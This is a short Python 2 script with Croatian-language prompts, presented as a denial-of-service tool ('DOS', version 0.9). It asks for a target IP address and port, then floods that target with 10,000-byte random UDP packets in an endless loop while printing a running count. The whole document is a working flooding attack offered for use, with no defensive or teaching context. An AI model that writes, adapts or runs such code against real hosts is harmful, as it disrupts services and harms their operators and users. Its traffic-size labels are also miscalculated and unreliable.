#Ne mijenjaj skriptu, pokreci sa python2!
#https://github.com/hakler25/harex.git
#Prnem ti
import sys 
import os
import time
import random
import socket
import colorama 
from colorama import Fore

#Postavke
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(10000)
#Postavke

os.system("clear") 

print Fore.YELLOW + " ____  _____  ___"
print "(  _ \(  _  )/ __)"
print " )(_) ))(_)( \__ \     Verzija - 0.9"
print "(____/(_____)(___/"

print ""
print Fore.BLUE + "Napravio  > HunteR_"
print Fore.WHITE + ""
print "Unesi IP i Port!"
print " " 
ip = raw_input("IP  > ")
port = input("Port  > ")
print " "

sent = 0

while True:

	sock.sendto(bytes, (ip, port))
	sent = sent + 1
	
	if sent < 100000:
		okr = "Manje od 100MB"
	elif sent < 500000: 
		okr = "Manje od 500MB"
	elif sent < 1000000:
		okr = "Manje od 1GB"
	elif sent < 5000000:
		okr = "Manje od 5GB"
	elif sent > 10000000:
		okr = "Preko 10GB"
	elif sent > 45000000:
		okr = "45+ GB"
		
	print "Poslano %skB(%s)"%(sent, okr)














